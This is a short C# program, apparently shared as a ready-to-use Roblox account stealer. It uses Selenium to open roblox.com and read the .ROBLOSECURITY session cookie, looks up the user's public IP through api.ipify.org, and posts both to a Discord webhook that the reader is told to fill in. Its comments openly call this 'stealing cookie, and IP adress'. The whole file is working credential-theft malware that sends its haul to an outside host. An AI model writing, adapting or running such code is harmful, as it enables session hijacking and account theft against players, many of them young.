using System;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using Newtonsoft.Json;

class Program
{
    static async Task Main(string[] args)
    {
        string webhookUrl = "YOUR_DC_WEBHOOK"; //  change this to your discord webhook so it can actually send it
        string robloxUrl = "https://www.roblox.com"; // can be what ever website but for this example we are doing Roblox

        
        IWebDriver driver = new ChromeDriver();
        driver.Navigate().GoToUrl(robloxUrl);

        // wait to it load
        System.Threading.Thread.Sleep(5000);

        // getting the cookie
        var cookies = driver.Manage().Cookies.AllCookies;
        string robloSecurityCookie = null;
        string ipAddress = GetPublicIpAddress();

        foreach (var cookie in cookies)
        {
            if (cookie.Name == ".ROBLOSECURITY") 
            {
                robloSecurityCookie = cookie.Value;
                break;
            }
        }

        // close  the browser
        driver.Quit();

        // *sending it to ur discord webhook*
        if (!string.IsNullOrEmpty(robloSecurityCookie))
        {
            var payload = new
            {
                content = $"ROBLOSECURITY Cookie: {robloSecurityCookie}\nIP Address: {ipAddress}" // stealing cookie, and IP adress
            };

            using (HttpClient client = new HttpClient())
            {
                var json = JsonConvert.SerializeObject(payload);
                var content = new StringContent(json, System.Text.Encoding.UTF8, "application/json");
                await client.PostAsync(webhookUrl, content);
            }
        }
        else
        {
            Console.WriteLine("No Cookie  .ROBLOSECURITY found."); // if it didn't found one meaning the user isn't sign in an account
        }
    }
// now this function here is getting his ip adresses, at your risk if you want to add it!
    static string GetPublicIpAddress()
    {
        using (HttpClient client = new HttpClient())
        {
            var response = client.GetStringAsync("https://api.ipify.org").Result;
            return response;
        }
    }
}
